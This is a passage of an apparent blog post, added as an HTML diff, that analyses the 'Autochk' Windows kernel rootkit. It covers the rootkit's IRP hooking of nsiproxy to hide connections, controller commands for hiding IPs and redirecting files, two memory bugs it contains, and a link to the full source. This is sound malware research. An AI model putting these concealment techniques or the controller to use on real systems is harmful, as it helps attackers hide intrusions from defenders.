+This method was published years ago in <a href="https://github.com/bowlofstew/rootkit.com/blob/c8869de5a947273c9c151b44aa39643a7fea531c/cardmagic/PortHidDemo_Vista.c">a rootkits.com post</a>, The attacker copied the method and changed it a bit so it
+could work in x64.</p>
+
+<p>This method is pretty unreliable.. Microsoft changes the <a href="https://community.osr.com/discussion/167887">nsi proxy driver all the time</a>
+So as a developer of this rootkit, you have to make sure to update the offsets to these structures..</p>
+
+<p>This rootkit also has a second technique to hide connections - it is used only when the nsiproxy driver is not found, we
+won&rsquo;t talk about this technique.</p>
+
+<h2 id="autochk-controller">Autochk Controller</h2>
+
+<p>The Autochk Rootkit can receive commands from user mode to:</p>
+
+<ul>
+<li><p>Mark process image is an ignored image. The file system redirection won&rsquo;t happen the process:
+<code>AutochkRootkitController.exe fs-ignore-process cmd.exe</code></p></li>
+
+<li><p>Add a file redirection: <code>AutochkRootkitController.exe redirect-file &ldquo;\users\stuff\desktop\a.txt&rdquo; &ldquo;\users\stuff\desktop\b.txt&rdquo;</code></p></li>
+
+<li><p>Hide an IP from network connections: <code>AutochkRootkitController.exe hide-ip 192.168.58.1</code></p></li>
+</ul>
+
+<p>I created a tool to control the autochk rootkit. It can be used to these requests to the rootkit (via IOCTLs).
+It works with the original signed rootkit..</p>
+
+<h2 id="funny-stuff">Funny Stuff</h2>
+
+<p>There are some bugs in this rootkit.</p>
+
+<p>Find the first bug:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">NTSTATUS <span style="color:#a6e22e">AutochkDeviceControl</span>(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+{
+	UNREFERENCED_PARAMETER(DeviceObject);
+
+	PIO_STACK_LOCATION IoStackLocation <span style="color:#f92672">=</span> IoGetCurrentIrpStackLocation(Irp);
+	ULONG InputBufferLength <span style="color:#f92672">=</span> IoStackLocation<span style="color:#f92672">-&gt;</span>Parameters.DeviceIoControl.InputBufferLength;
+	Irp<span style="color:#f92672">-&gt;</span>IoStatus.Status <span style="color:#f92672">=</span> STATUS_SUCCESS;
+
+	<span style="color:#66d9ef">switch</span> (IoStackLocation<span style="color:#f92672">-&gt;</span>Parameters.DeviceIoControl.IoControlCode)
+	{
+		........
+        ........
+	}
+
+exit:
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+
+	<span style="color:#66d9ef">return</span> Irp<span style="color:#f92672">-&gt;</span>IoStatus.Status;
+}</code></pre></div>
+
+<p>IoCompleteRequest frees the IRP. <code>return Irp-&gt;IoStatus.Status</code> is a common mistake (for beginners) in IRP handlers.
+The second bug is here:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">// Inside Nsi Proxy Device Io Control Completion Routine
+</span><span style="color:#75715e"></span>ExFreePool(HookedContext);
+
+<span style="color:#66d9ef">if</span> (HookedContext<span style="color:#f92672">-&gt;</span>InvokeOnSuccess <span style="color:#f92672">&amp;&amp;</span> IoGetNextIrpStackLocation(Irp)<span style="color:#f92672">-&gt;</span>CompletionRoutine)
+{
+    <span style="color:#66d9ef">return</span> IoGetNextIrpStackLocation(Irp)<span style="color:#f92672">-&gt;</span>CompletionRoutine(DeviceObject, Irp, HookedContext);
+}</code></pre></div>
+
+<p>The funny thing is, this use after free bug exists also in the
+<a href="https://github.com/bowlofstew/rootkit.com/blob/c8869de5a947273c9c151b44aa39643a7fea531c/cardmagic/PortHidDemo_Vista.c">original rootkits.com code</a>.</p>
+
+<p>There are other funny things in this rootkit. (kernel memory read primitives.. and others..)
+It&rsquo;s funny to see this stuff coming from a so-called &ldquo;apt&rdquo; group.</p>
+
+<h2 id="summary">Summary</h2>
+
+<p>I know this rootkit is not that fancy.. but it is nice in my opinion. IRP hooking is pretty useful for rootkits.
+I&rsquo;ll continue posting stuff about rootkit techniques (and the source code of some interesting software..), hope you enjoy.
+I think learning about rootkit techniques is a cool way to learn about the windows operating system.
+I&rsquo;ll be happy to hear your feedback! Contact me via twitter messages <a href="https://twitter.com/0xrepnz">@0xrepnz</a></p>
+
+<p>This is the link to the full source code: <a href="https://github.com/repnz/autochk-rootkit">https://github.com/repnz/autochk-rootkit</a></p>
+
+</div>
+
+
+    </main>
+
+    
+  </body>
+</html>
